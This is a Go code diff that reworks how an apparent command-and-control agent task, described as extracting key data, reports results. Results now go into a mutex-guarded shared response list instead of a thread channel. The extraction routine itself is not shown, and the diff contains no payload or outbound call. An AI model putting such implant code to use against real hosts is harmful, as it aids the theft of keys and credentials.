@@ -4,7 +4,11 @@ import (
 	"encoding/json"
 
 	"pkg/utils/structs"
+	"sync"
+	"pkg/profiles"
 )
+
+var mu sync.Mutex
 
 //KeyInformation - interface for key data
 type KeyInformation interface {
@@ -20,29 +24,43 @@ type Options struct {
 }
 
 //Run - extract key data
-func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
+func Run(task structs.Task) {
 	//Check if the types are available
-	tMsg := structs.ThreadMsg{}
-	tMsg.Error = false
-	tMsg.TaskItem = task
+	msg := structs.Response{}
+	msg.TaskID = task.TaskID
 	opts := Options{}
 	err := json.Unmarshal([]byte(task.Params), &opts)
 
 	if err != nil {
-		tMsg.Error = true
-		tMsg.TaskResult = []byte(err.Error())
-		threadChannel <- tMsg
+		msg.UserOutput = err.Error()
+		msg.Completed = true
+		msg.Status = "error"
+
+		resp, _ := json.Marshal(msg)
+		mu.Lock()
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		mu.Unlock()
 		return
 	}
 
 	res, err := getkeydata(opts)
 	if err != nil {
-		tMsg.Error = true
-		tMsg.TaskResult = []byte(err.Error())
-		threadChannel <- tMsg
+		msg.UserOutput = err.Error()
+		msg.Completed = true
+		msg.Status = "error"
+
+		resp, _ := json.Marshal(msg)
+		mu.Lock()
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		mu.Unlock()
 		return
 	}
 
-	tMsg.TaskResult = res.Data()
-	threadChannel <- tMsg
+	msg.Completed = true
+	msg.UserOutput = string(res.Data())
+	resp, _ := json.Marshal(msg)
+	mu.Lock()
+	profiles.TaskResponses = append(profiles.TaskResponses, resp)
+	mu.Unlock()
+	return
 }
